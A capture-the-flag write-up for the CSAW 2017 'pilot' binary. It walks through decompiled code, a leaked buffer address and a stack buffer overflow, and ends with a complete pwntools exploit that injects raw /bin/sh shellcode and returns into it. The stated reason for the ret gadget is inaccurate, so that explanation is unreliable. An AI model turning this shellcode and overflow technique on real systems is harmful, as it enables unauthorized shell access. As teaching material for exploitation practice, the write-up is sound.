**This is a writeup for the csaw17 pilot challenge**

Let's take a look at our main function
```
undefined8 FUN_004009a6(void)

{
  ostream *poVar1;
  ssize_t sVar2;
  undefined8 uVar3;
  undefined1 input [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]Welcome DropShip Pilot...");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]I am your assitant A.I....");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]I will be gui ding you through the tutorial....")
  ;
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,
                           "[*]As a first step, lets learn how to land at th e designated location...."
                          );
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,
                           "[*]Your mission is to lead the dropship to the right location and execute sequence of instru ctions to save Marines & Medics..."
                          );
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]Good Luck  Pilot!....");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"[*]Location:") ;
  poVar1 = (ostream *)std::ostream::operator<<(poVar1,input);
  std::ostream::operator<<(poVar1,std::endl<>);
  std::operator<<((ostream *)std::cout,"[*]Command:");
  sVar2 = read(0,input,0x40);
  if (sVar2 < 5) {
    poVar1 = std::operator<<((ostream *)std::cout,"[*]There ar e no commands....");
    std::ostream::operator<<(poVar1,std::endl<>);
    poVar1 = std::operator<<((ostream *)std::cout,"[*]Mission F ailed....");
    std::ostream::operator<<(poVar1,std::endl<>);
    uVar3 = 0xffffffff;
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}
```

For the most part, this code prints out the text:
```
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fff3bac5960
[*]Command:
```
From this output there is two things that we need to note
1. We are getting the hex address of some location in the program
2. We are getting prompted for user input after the Command: line is printed.

Ok so in these two lines we can see that it is printing the address to the beginning of the input buffer
```
poVar1 = std::operator<<((ostream *)std::cout,"[*]Location:") ;
  poVar1 = (ostream *)std::ostream::operator<<(poVar1,input);
```

One thing to note with these lines of code is that the address is randomized during each run. This means that you cannot hardcode this address, but instead need to capture the memory leak and use that.

We can capture it by using these lines of code:
```
r.recvuntil(b"[*]Location:")
BUFF_ADDR = int(r.recvline().strip(), 16)
```

The next thing we need to do is see what we need to input into the program to get the flag.
```
std::operator<<((ostream *)std::cout,"[*]Command:");
sVar2 = read(0,input,0x40);
```
From these lines, we can see that we are taking an input of 0x40 bytes which means that we can overflow our input buffer since our input buffer is only 32 bytes big.

Lets take a look at our stack layout so we can get an idea of what we need to input.
```
<RETURN>
Stack[-0x28]:32 input
```

Based off of the stack, the most we can do is overflow our input buffer and potenitally overwrite our return address.

When we look at the other functions in our program, there is not a "printFlag" function or a "giveShell" function.
What does this mean??? 
It means that we need to use shellcode so that when the program executes it, we are able to get a shell on the machine and read the flag file.

What is shell code? Shell code is a small piece of machine code that when executed whill run a command shell (like /bin/sh).

So lets use the shell code as input into our buffer. Our payload will look like this

```
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload = shellcode
```

Ok so now that we have our shell code in our buffer, we need to continue writing values untill we reach our return address. To do so we can add this line of code to the payload which takes the difference in length of our shellcode and subtracts it from our total offset from the input buffer to return addres.
```
payload += b'0' * (0x28 - len(shellcode))
```

Ok so now we have successfully filled up our input buffer meaning that we are now in the return address.

We can overwrite the return address with the leaked address of our input buffer. So why would we do that? This would set the EIP to our input buffer so when we reach the return, it will return to our input buffer and execute the command there. Since the shellcode is in our input buffer, that means it will execute our shellcode and and spawn a shell.

Lets modify our payload to take in the targeted address
```
payload += p64(BUFF_ADDR)
```

Lastly. since this is a 64-bit program, we will need to add a ROPGadget since arguments are passed by registers instead of the stack. This allows us to pop the data we need from the stack into the register so that we can get a proper function call.

We can find the return ROP by running the command
```
ROPgadget --binary ./pilot | grep ret
```

After we find the ret gadget, we can store it in a variable named "ret"

Now we can construct our entire payload
```
payload = shellcode + b'0' * (0x28 - len(shellcode)) + p64(ret) + p64(BUFF_ADDR)
```

**Final Exploit**
```
from pwn import *

BINARY = "./pilot"
elf = ELF(BINARY)
context.binary = elf
r = process(BINARY)

binary_shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
OFFSET = 0x28
ret = 0x00000000004007d9
 

r.recvuntil(b"[*]Location:")
BUFF_ADDR = int(r.recvline().strip(), 16)
payload = binary_shellcode + b"0" * (OFFSET - len(binary_shellcode)) + p64(ret) + p64(BUFF_ADDR)
r.sendline(payload)
r.interactive()
```